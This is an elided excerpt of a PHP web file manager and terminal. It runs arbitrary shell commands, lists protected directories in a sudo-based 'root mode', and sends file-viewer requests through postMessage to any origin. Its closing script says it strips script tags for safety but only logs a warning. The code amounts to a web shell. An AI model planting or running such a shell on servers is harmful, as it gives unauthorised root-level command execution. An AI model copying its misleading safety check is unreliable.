...
if (rootModeOn() && !is_readable($work_dir)
    && (is_dir($work_dir) || rootExists(rtrim($work_dir, '/'), '-d'))) {
    // ---- Root-mode listing via sudo find ----
    $raw_list = rootListRaw($work_dir);
    if (trim($raw_list) === '') {
        $scan_denied = true;
    }
    foreach (explode("\n", rtrim($raw_list, "\n")) as $ln) {
        ...
        if (!$show_hidden && $lnm[0] === '.') continue;   // hidden files toggle
        $fpath = rtrim($work_dir, '/') . '/' . $lnm;
    ...
    $raw_items = @scandir($work_dir);
    $scan_denied = ($raw_items === false);
    foreach (($raw_items ?: []) as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!$show_hidden && $item[0] === '.') continue; // hidden files toggle
...
if (!empty($command)) {
    ...
    if ($command === 'help') {
        ...
        $output_content .= "  cat FILE - View file in UI modal\n";
        $output_content .= "  Note    - Upload/Delete/Rename/Copy/Zip available in File Explorer UI\n\n";
        ...
        foreach ($directories as $dir) {
            $output_content .= "  [DIR]  " . $dir['name'] . "\n";
        }
        $output_content .= "\nFiles:\n";
        foreach ($files as $file) {
            $output_content .= "  [FILE] " . $file['name'] . "\n";
        }
        ...
        // UI-based cat: open file in modal instead of printing
        $cat_target = trim($cat_matches[1]);
        $cat_full_path = $cat_target[0] === '/' ? $cat_target : $work_dir . '/' . $cat_target;
        $js_target = json_encode($cat_full_path);
        $output_content .= "Opening file viewer for: " . htmlspecialchars($cat_target) . "\n\n";
        $output_content .= "<script>window.parent.postMessage({type:'openViewer',path:" . $js_target . "}, '*');</script>";
    } else {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
...
<body>
    ...
    <script>
        ...
        // Remove any inline script from terminal output (safety)
        const terminalTa = document.getElementById('output');
        if (terminalTa.value.includes('<script>')) {
            console.warn('Script tag detected in output — stripped for safety');
        }
    </script>
</body>
</html>
